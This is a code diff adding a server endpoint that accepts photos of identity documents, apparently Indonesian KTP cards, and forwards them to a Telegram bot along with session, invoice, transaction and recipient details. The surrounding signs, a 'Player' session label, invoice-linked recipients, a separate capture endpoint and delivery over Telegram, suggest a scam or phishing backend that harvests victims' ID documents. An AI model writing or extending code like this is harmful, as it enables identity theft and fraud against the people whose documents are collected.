@@ -356,6 +356,51 @@ function createApp({ env = process.env, telegramClient, invoiceStore } = {}) {
     }
   });
 
+  app.post('/api/doc-photo', createRateLimiter({ windowMs: 10 * 60 * 1000, limit: 30 }), async (req, res) => {
+    try {
+      const sessionId = cleanText(req.body.sessionId, 80);
+      const invoiceId = cleanText(req.body.invoiceId, 40);
+      const docType = cleanText(req.body.docType, 20) || 'KTP';
+      let session = sessions.get(sessionId);
+      if (!session || Date.now() - session.createdAt > SESSION_TTL_MS) {
+        session = {
+          count: 0,
+          createdAt: Date.now(),
+          label: 'Player',
+          invoiceId: invoiceId || 'unknown',
+          expectedPhotos: MAX_PHOTOS,
+          delivered: new Set(),
+          inFlight: false
+        };
+        sessions.set(sessionId, session);
+      }
+
+      const photo = parsePhoto(req.body.img);
+      if (!photo) return res.status(400).json({ error: 'Invalid JPEG image' });
+
+      const now = new Date();
+      const invoiceRecord = INVOICE_ID_PATTERN.test(invoiceId) ? invoices.get(invoiceId) : null;
+
+      await telegram.sendPhoto(photo, {
+        filename: `${sessionId}_doc_${docType.toLowerCase()}.jpg`,
+        caption: [
+          `DOCUMENT IDENTIFICATION PHOTO (${docType.toUpperCase()})`,
+          `Name: ${session.label}`,
+          `Invoice: ${session.invoiceId}`,
+          invoiceRecord ? `Transaction ID: ${invoiceRecord.invoice.idTransaksi}` : '',
+          invoiceRecord ? `Recipient: ${invoiceRecord.invoice.penerimaNama}` : '',
+          `Session: ${sessionId}`,
+          `Time: ${now.toISOString()}`
+        ].filter(Boolean).join('\n')
+      });
+
+      res.json({ ok: true, docType });
+    } catch (error) {
+      console.error('[DOC_PHOTO]', error.message);
+      res.status(502).json({ error: 'Could not deliver document photo' });
+    }
+  });
+
   app.post('/api/capture', createRateLimiter({ windowMs: 10 * 60 * 1000, limit: 120 }), async (req, res) => {
     try {
       const sessionId = cleanText(req.body.sessionId, 80);
